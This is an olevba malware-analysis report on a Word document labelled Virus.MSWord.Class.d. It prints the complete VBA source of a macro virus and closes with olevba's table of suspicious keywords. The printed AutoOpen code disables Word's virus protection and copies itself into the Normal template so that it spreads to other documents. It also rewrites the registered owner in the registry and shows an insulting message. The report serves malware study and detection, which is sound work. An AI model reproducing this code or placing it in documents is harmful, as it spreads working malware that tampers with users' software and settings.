olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Class.d-afd4932ce43241497153de94637b012d20b36092
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Class.d-afd4932ce43241497153de94637b012d20b36092 - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Private Declare Function RegOpenKeyExA Lib "advapi32.dll" (ByVal hKey As Long, ByVal lpSubKey As String, ByVal ulOptions As Long, ByVal samDesired As Long, phkResult As Long) As Long
'user07.11.05 12:51:09стандарт б-план
Private Declare Function RegSetValueExA Lib "advapi32.dll" (ByVal hKey As Long, ByVal lpValueName As String, ByVal Reserved As Long, ByVal dwType As Long, ByVal lpValue As String, ByVal cbData As Long) As Long
'user07.11.05 12:51:09стандарт б-план
Private Declare Function RegCloseKey Lib "advapi32.dll" (ByVal hKey As Long) As Long
'user07.11.05 12:51:09стандарт б-план
Const REG_SZ As Long = 1
'user07.11.05 12:51:09стандарт б-план
Const HKEY_CURRENT_USER As Long = &H80000001
'user07.11.05 12:51:09стандарт б-план
Const HKEY_LOCAL_MACHINE As Long = &H80000002
'user07.11.05 12:51:09стандарт б-план
Sub AutoOpen()
'user07.11.05 12:51:09стандарт б-план
On Error GoTo out
'user07.11.05 12:51:09стандарт б-план
Options.VirusProtection = False
'user07.11.05 12:51:09стандарт б-план
Options.SaveNormalPrompt = False
'user07.11.05 12:51:09стандарт б-план
Options.ConfirmConversions = False
'user07.11.05 12:51:09стандарт б-план
ad = ActiveDocument.VBProject.VBComponents.Item(1).codemodule.CountOfLines
'user07.11.05 12:51:09стандарт б-план
nt = NormalTemplate.VBProject.VBComponents.Item(1).codemodule.CountOfLines
'user07.11.05 12:51:09стандарт б-план
If nt > 70 And ad > 0 Then GoTo out
'user07.11.05 12:51:09стандарт б-план
If nt < 70 Then
'user07.11.05 12:51:09стандарт б-план
    Set host = NormalTemplate.VBProject.VBComponents.Item(1)
'user07.11.05 12:51:09стандарт б-план
    ActiveDocument.VBProject.VBComponents.Item(1).Name = host.Name
'user07.11.05 12:51:09стандарт б-план
    ActiveDocument.VBProject.VBComponents.Item(1).Export "c:\class.sys"
'user07.11.05 12:51:09стандарт б-план
End If
'user07.11.05 12:51:09стандарт б-план
If ad = 0 Then Set host = ActiveDocument.VBProject.VBComponents.Item(1)
'user07.11.05 12:51:09стандарт б-план
If Day(Now) = 14 And Month(Now) > 5 Then MsgBox "I Think " & Application.UserName & " is a big stupid jerk!", 0, "Class.Poppy"
'user07.11.05 12:51:09стандарт б-план
host.codemodule.AddFromFile ("c:\class.sys")
'user07.11.05 12:51:09стандарт б-план
With host.codemodule
'user07.11.05 12:51:09стандарт б-план
    For x = 1 To 16
'user07.11.05 12:51:09стандарт б-план
    .deletelines 1
'user07.11.05 12:51:09стандарт б-план
    Next x
'user07.11.05 12:51:09стандарт б-план
End With
'user07.11.05 12:51:09стандарт б-план
If nt < 70 Then
'user07.11.05 12:51:09стандарт б-план
    With host.codemodule
'user07.11.05 12:51:09стандарт б-план
    .replaceline 1, "Sub AutoClose()"
'user07.11.05 12:51:09стандарт б-план
    .replaceline 91, "Sub ToolsMacro()"
'user07.11.05 12:51:09стандарт б-план
    For x = 70 To 81
'user07.11.05 12:51:09стандарт б-план
        .deletelines 62
'user07.11.05 12:51:09стандарт б-план
    Next x
'user07.11.05 12:51:09стандарт б-план
    .replaceline 35, "    For x = 1 To 4"
'user07.11.05 12:51:09стандарт б-план
    End With
'user07.11.05 12:51:09стандарт б-план
End If
'user07.11.05 12:51:09стандарт б-план
If nt < 70 Then
'user07.11.05 12:51:09стандарт б-план
u = RegOpenKeyExA(HKEY_LOCAL_MACHINE, "Software\Microsoft\Windows\CurrentVersion", 0, KEY_ALL_ACCESS, k)
'user07.11.05 12:51:09стандарт б-план
u = RegSetValueExA(k, "RegisteredOwner", 0, REG_SZ, "VicodinES /CB /TNN", 1)
'user07.11.05 12:51:09стандарт б-план
u = RegSetValueExA(k, "RegisteredOrganization", 0, REG_SZ, "-(Dr. Diet Mountain Dew)-", 1)
'user07.11.05 12:51:09стандарт б-план
u = RegCloseKey(k)
'user07.11.05 12:51:09стандарт б-план
End If
'user07.11.05 12:51:09стандарт б-план
With host.codemodule
'user07.11.05 12:51:09стандарт б-план
    For x = 2 To 104 Step 2
'user07.11.05 12:51:09стандарт б-план
    .replaceline x, "'" & Application.UserName & Now & Application.ActivePrinter & Application.ActiveWindow
'user07.11.05 12:51:09стандарт б-план
    Next x
'user07.11.05 12:51:09стандарт б-план
End With
'user07.11.05 12:51:09стандарт б-план
out:
'user07.11.05 12:51:09стандарт б-план
If nt > 70 And ad = 0 Then ActiveDocument.SaveAs FileName:=ActiveDocument.FullName
'user07.11.05 12:51:09стандарт б-план
End Sub
'user07.11.05 12:51:09стандарт б-план
Sub ViewVBCode()
'user07.11.05 12:51:09стандарт б-план
End Sub
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|AutoExec  |AutoClose           |Runs when the Word document is closed        |
|Suspicious|Windows             |May enumerate application windows (if        |
|          |                    |combined with Shell.Application object)      |
|Suspicious|Lib                 |May run code from a DLL                      |
|Suspicious|RegOpenKeyExA       |May read or write registry keys              |
|Suspicious|RegCloseKey         |May read or write registry keys              |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|codemodule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|IOC       |advapi32.dll        |Executable file name                         |
+----------+--------------------+---------------------------------------------+

